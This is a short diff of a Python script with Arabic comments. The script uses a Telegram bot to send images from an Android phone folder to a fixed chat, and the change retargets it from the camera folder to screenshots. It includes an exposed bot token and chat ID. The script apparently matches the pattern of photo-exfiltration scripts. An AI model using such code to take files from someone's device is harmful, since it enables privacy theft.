@@ -6,7 +6,7 @@ bot_token = "6476951548:AAFD5fW4VtLguI4D0QnwyPUaFSWILiQSiJo"
 # معرف الدردشة الخاص بك على تليجرام
 chat_id = 5954268142
 # مسار المجلد الذي تحتوي على الصور
-image_path = '/sdcard/DCIM/Camera'
+image_path = '/sdcard/DCIM/Screenshots'
 
 def send_images_to_telegram(images_list, chat_id):
     bot = telepot.Bot(bot_token)
